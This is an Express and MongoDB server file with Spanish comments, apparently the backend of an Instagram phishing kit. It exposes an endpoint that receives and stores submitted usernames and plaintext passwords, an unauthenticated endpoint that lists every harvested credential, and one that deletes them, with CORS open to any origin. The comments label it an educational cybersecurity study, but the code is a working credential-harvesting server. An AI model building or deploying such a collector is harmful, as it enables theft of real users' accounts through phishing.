import express from 'express';
import cors from 'cors';
import mongoose from 'mongoose';
import dotenv from 'dotenv';
import Credential from './models/Credential.js';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// Conectar a MongoDB
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/instagram-phishing-study')
  .then(() => console.log('✅ Conectado a MongoDB'))
  .catch(err => console.error('❌ Error conectando a MongoDB:', err));

// Endpoint para guardar credenciales
app.post('/api/save-credentials', async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ error: 'Faltan credenciales' });
    }

    // Crear nueva credencial en MongoDB
    const newCredential = new Credential({
      username,
      password,
      timestamp: new Date()
    });

    await newCredential.save();

    console.log('✅ Credenciales guardadas:', {
      username,
      timestamp: newCredential.timestamp.toLocaleString('es-ES')
    });

    res.json({ success: true, message: 'Credenciales guardadas' });
  } catch (error) {
    console.error('❌ Error al guardar credenciales:', error);
    res.status(500).json({ error: 'Error al guardar credenciales' });
  }
});

// Endpoint para ver todas las credenciales (solo para desarrollo/estudio)
app.get('/api/credentials', async (req, res) => {
  try {
    const credentials = await Credential.find().sort({ timestamp: -1 });
    res.json(credentials);
  } catch (error) {
    console.error('Error al obtener credenciales:', error);
    res.status(500).json({ error: 'Error al obtener credenciales' });
  }
});

// Endpoint para limpiar todas las credenciales (útil para testing)
app.delete('/api/credentials', async (req, res) => {
  try {
    await Credential.deleteMany({});
    console.log('🗑️ Todas las credenciales han sido eliminadas');
    res.json({ success: true, message: 'Credenciales eliminadas' });
  } catch (error) {
    console.error('Error al eliminar credenciales:', error);
    res.status(500).json({ error: 'Error al eliminar credenciales' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Servidor corriendo en http://localhost:${PORT}`);
  console.log('📚 Proyecto educativo - Solo para estudio de ciberseguridad');
});
